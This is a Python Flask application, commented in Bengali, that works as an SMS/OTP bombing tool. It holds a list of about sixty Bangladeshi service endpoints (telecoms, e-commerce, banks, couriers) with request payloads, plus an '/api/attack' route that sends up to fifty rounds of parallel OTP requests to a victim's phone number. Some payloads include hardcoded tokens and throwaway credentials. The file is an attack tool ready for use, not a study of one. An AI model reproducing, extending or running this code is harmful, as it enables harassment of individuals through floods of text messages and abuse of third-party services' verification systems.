from flask import Flask, render_template, request, jsonify
import requests
import concurrent.futures
import time

app = Flask(__name__)

# ============================================================
#  API কনফিগারেশন (নাম + পেলোড ফরম্যাট সহ)
# ============================================================
API_CONFIGS = [
    {"name": "Grameenphone", "url": "https://weblogin.grameenphone.com/backend/api/v1/otp", "method": "POST", "data": {"msisdn": ""}},
    {"name": "Chorki", "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", "method": "POST", "data": {"number": ""}},
    {"name": "Apex", "url": "https://api.apex4u.com/api/auth/login", "method": "POST", "data": {"phoneNumber": ""}},
    {"name": "Bioscope", "url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", "method": "POST", "data": {"number": ""}},
    {"name": "Pickaboo", "url": "https://www.pickaboo.com/rest/default/V1/customer-check/exist", "method": "POST", "data": {"mobile": ""}},
    {"name": "Bikroy (GET)", "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login", "method": "GET", "params": {"phone": ""}},
    {"name": "Toffee", "url": "https://prod-services.toffeelive.com/sms/v1/subscriber/signup", "method": "POST", "data": {"mobile": ""}},
    {"name": "Deeptoplay", "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "method": "POST", "data": {"number": ""}},
    {"name": "Banglalink Validation", "url": "https://web-api.banglalink.net/api/v1/user/number/validation/", "method": "GET"},
    {"name": "Shajgoj", "url": "https://api.shajgoj.com/api/v2/auth/send-otp", "method": "POST", "data": {"mobile": ""}},
    {"name": "Banglalink Care", "url": "https://care.banglalink.net/api/v1/auth/send-otp", "method": "POST", "data": {"msisdn": ""}},
    {"name": "Daraz", "url": "https://www.daraz.com.bd/customer/api/send_otp", "method": "POST", "data": {"phone": ""}},
    {"name": "Foodpanda", "url": "https://api.foodpanda.com.bd/api/v1/login/otp", "method": "POST", "data": {"phone": ""}},
    {"name": "Osudpotro", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "method": "POST", "data": {"phoneNumber": ""}},
    {"name": "Paperfly", "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "method": "POST", "data": {"phone_number": ""}},
    {"name": "Ghoori", "url": "https://api.ghoorilearning.com/api/auth/signup/otp", "method": "POST", "data": {"mobile_no": ""}},
    {"name": "Doctime", "url": "https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", "method": "POST", "data": {"data": {"country_calling_code": "88", "contact_no": "", "headers": {"PlatForm": "Web"}}}},
    {"name": "Sundarban", "url": "https://api-gateway.sundarbancourierltd.com/graphql", "method": "POST", "data": {"operationName": "CreateAccessToken", "variables": {"accessTokenFilter": {"userName": ""}}, "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"}},
    {"name": "Robi", "url": "https://webapi.robi.com.bd/v1/send-otp", "method": "POST", "data": {"phone_number": "", "type": "doorstep"}},
    {"name": "Redx", "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "method": "POST", "data": {"phoneNumber": ""}},
    {"name": "Fundesh", "url": "https://fundesh.com.bd/api/auth/generateOTP", "method": "POST", "data": {"msisdn": ""}},
    {"name": "Motionview", "url": "https://api.motionview.com.bd/api/send-otp-phone-signup", "method": "POST", "data": {"phone": ""}},
    {"name": "Jatri", "url": "https://user-api.jslglobal.co:444/v2/send-otp", "method": "POST", "data": {"phone": "+88", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}},
    {"name": "Bikash", "url": "https://us-central1-bikash-227008.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", "method": "POST", "data": {"country_calling_code": "88", "contact_no": "", "headers": {"PlatForm": "Web"}}},
    {"name": "Shikho", "url": "https://api.shikho.com/auth/v2/send/sms", "method": "POST", "data": {"mobile": "", "reason": "LOGIN", "vendor": "shikho"}},
    {"name": "Ekshop", "url": "https://ekshop.com.bd/v3/api/auth/register-otp", "method": "POST", "data": {"mobile_number": "", "type": "customer", "token": "473c22b102b7ec9992f0ddb853503460"}},
    {"name": "Easy", "url": "https://core.easy.com.bd/api/v1/registration", "method": "POST", "data": {"name": "Limon Islam", "email": "uyrlhkgxqw@emergentvillage.org", "mobile": "", "password": "boss#2022", "password_confirmation": "boss#2022", "device_key": "9a28ae67c5704e1fcb50a8fc4ghjea4d"}},
    {"name": "FSIBL", "url": "https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber", "method": "POST", "data": {"AccessToken": "", "TrackingNo": "", "mobileNo": "", "otpSms": "", "product_id": "122", "requestChannel": "MOB", "trackingStatus": 5}},
    {"name": "Shomvob", "url": "https://api.shomvob.co/api/v2/otp/phone?is_retry=0", "method": "POST", "data": {"phone": ""}},
    {"name": "BongoBD", "url": "https://apps.bongobd.com/api/v1/auth/otp-login/send-otp", "method": "POST", "data": {"cli": ""}},
    {"name": "MCB Affiliate", "url": "https://www.mcbaffiliate.com/Affiliate/RequestOTP", "method": "POST", "data": {"PhoneNumber": ""}},
    {"name": "MithaiBD", "url": "https://mithaibd.com/api/login/?lang_code=en&currency_code=BDT", "method": "POST", "data": {"company_id": "2", "password2": "Rahu333@@", "currency_code": "BDT", "user_type": "C", "email": "fuckyoubro@gmail.com", "g_id": "", "lang_code": "en", "operating_system": "Android", "otp_verify": False, "password1": "Rahu333@@", "phone": "", "storefront_id": "5"}},
    {"name": "EnglishMoja", "url": "https://api.englishmojabd.com/api/v1/auth/login", "method": "POST", "data": {"phone": "+88"}},
    {"name": "Moveon", "url": "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp", "method": "POST", "data": {"phone": "", "login_type": "signup"}},
    {"name": "Pathao", "url": "https://api.pathao.com/api/v1/auth/request-otp", "method": "POST", "data": {"phone": ""}},
    {"name": "Qcoom", "url": "https://auth.qcoom.com/api/v1/otp/send", "method": "POST", "data": {"mobileNumber": "+88"}},
    {"name": "Circle", "url": "https://reseller.circle.com.bd/api/v2/auth/signup", "method": "POST", "data": {"name": "+88", "email_or_phone": "+88", "password": "123456lmn", "password_confirmation": "123456lmn", "register_by": "phone"}},
    {"name": "Toybox", "url": "https://api.toybox.com.bd/v1/auth/request-otp", "method": "POST", "data": {"phone": ""}},
    {"name": "RootsEdu", "url": "https://rootsedulive.com/api/auth/forget-password", "method": "POST", "data": {"phoneOrEmail": "88"}},
    {"name": "Hishabee", "url": "https://app.hishabee.business/api/V2/otp/send", "method": "POST", "params": {"mobile_number": ""}},
    {"name": "BKShop", "url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", "method": "POST", "data": {"phone": "", "email": "", "language": "en"}},
    {"name": "MyGP 1", "url": "https://api.mygp.cinematic.mobi/api/v1/send-common-otp", "method": "GET", "params": {"mobile": "", "otp_type": "REGISTER", "user_type": "PREPAID"}},
    {"name": "MyGP 2", "url": "https://api.mygp.cinematic.mobi/api/v1/send-common-otp", "method": "GET", "params": {"mobile": "", "otp_type": "REGISTER", "user_type": "PREPAID"}},
    {"name": "Redx Signup", "url": "https://api.redx.com.bd/v1/user/signup", "method": "POST", "data": {"name": "961096106", "phoneNumber": "", "service": "redx"}},
    {"name": "Bikroy Cloud", "url": "https://us-central1-bikroy-478a5.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", "method": "POST", "data": {"contact_no": ""}},
    {"name": "E-Pathagar", "url": "https://us-central1-e-pathagar-56b27.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", "method": "POST", "data": {"country_calling_code": "88", "contact_no": "", "headers": {"PlatForm": "Web"}}},
    {"name": "Pathao Cloud", "url": "https://us-central1-pathao-41616.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", "method": "POST", "data": {"country_calling_code": "88", "contact_no": "", "headers": {"PlatForm": "Web"}}},
    {"name": "Bikash Web", "url": "https://www.bikash.com/send-otp", "method": "POST", "data": {"mobileNumber": ""}},
    {"name": "Bikroy API", "url": "https://api.bikroy.com/api/v1/auth/send-otp", "method": "POST", "data": {"phone": "", "email": "limon@gmail.com", "password": "boss#2022"}},
    {"name": "Shikho API", "url": "https://shikho.com/api/v1/auth/send-otp", "method": "POST", "data": {"phone": "", "reason": "login", "vendor": "shikho"}},
    {"name": "BongoBD Alt", "url": "https://apps.bongobd.com/api/v1/auth/otp-login/send-otp", "method": "POST", "data": {"cli": ""}},
    {"name": "Moveon Alt", "url": "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp", "method": "POST", "data": {"phone": "", "login_type": "signup"}},
    {"name": "Bikash Web Alt", "url": "https://www.bikash.com/send-otp", "method": "POST", "data": {"mobileNumber": ""}},
    {"name": "MCB Affiliate Alt", "url": "https://www.mcbaffiliate.com/Affiliate/RequestOTP", "method": "POST", "data": {"PhoneNumber": ""}},
    {"name": "Shomvob Backend", "url": "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0", "method": "POST", "data": {"phone": ""}},
    {"name": "Sundarban Alt", "url": "https://api-gateway.sundarbancourierltd.com/graphql", "method": "POST", "data": {"operationName": "CreateAccessToken", "variables": {"accessTokenFilter": {"userName": ""}}, "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"}},
    {"name": "Robi Chat", "url": "https://webapi.robi.com.bd/v1/chat/send-otp", "method": "POST", "data": {"phone_number": "", "name": "Johny Singh", "type": "video-chat"}},
    {"name": "Robi DA", "url": "https://da-api.robi.com.bd/da-nll/otp/send", "method": "POST", "data": {"msisdn": ""}},
    {"name": "Banglalink Eshop", "url": "https://eshop-api.banglalink.net/api/v1/customer/send-otp", "method": "POST", "data": {"type": "phone", "phone": ""}},
    {"name": "Chinaonline", "url": "https://chinaonlinebd.com/api/login/getOtp", "method": "GET", "params": {"phone": ""}},
    {"name": "Jatri Alt", "url": "https://user-api.jslglobal.co:444/v1/send-otp", "method": "POST", "data": {"phone": "+88", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}}
]

# ============================================================
#  রিকোয়েস্ট পাঠানোর ফাংশন (দ্রুত)
# ============================================================
def send_request(api, phone):
    try:
        url = api["url"]
        method = api.get("method", "POST")
        
        # পেলোড প্রস্তুত
        payload = api.get("data", {}).copy()
        params = api.get("params", {}).copy()
        
        # পেলোডে ফোন বসানো
        def fill_phone(obj):
            if isinstance(obj, dict):
                for key in obj:
                    if isinstance(obj[key], str) and obj[key] == "":
                        obj[key] = phone
                    elif isinstance(obj[key], dict):
                        fill_phone(obj[key])
            return obj
        
        payload = fill_phone(payload)
        params = fill_phone(params)
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json"
        }
        
        # টাইমআউট কমিয়ে দ্রুত করা
        if method.upper() == "POST":
            response = requests.post(url, json=payload, params=params, headers=headers, timeout=5)
        else:
            response = requests.get(url, params=params, headers=headers, timeout=5)
        
        return {"success": response.status_code in [200, 201, 202, 204], "status": response.status_code}
    except Exception as e:
        return {"success": False, "error": str(e)}

# ============================================================
#  Flask রাউট
# ============================================================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/attack', methods=['POST'])
def attack():
    data = request.get_json()
    phone = data.get('phone', '').strip()
    amount = data.get('amount', 1)
    
    if not phone or len(phone) < 10:
        return jsonify({"error": "Invalid phone number"}), 400
    
    if amount > 50:
        amount = 50
    
    results = []
    
    # সব API-তে প্যারালাল রিকোয়েস্ট (দ্রুত)
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        future_to_api = {}
        for _ in range(amount):
            for api in API_CONFIGS:
                future = executor.submit(send_request, api, phone)
                future_to_api[future] = api
        
        for future in concurrent.futures.as_completed(future_to_api):
            api = future_to_api[future]
            result = future.result()
            result["api_name"] = api.get("name", "Unknown API")
            results.append(result)
    
    success_count = sum(1 for r in results if r.get("success", False))
    total = len(results)
    
    return jsonify({
        "total": total,
        "success": success_count,
        "failed": total - success_count,
        "results": results
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)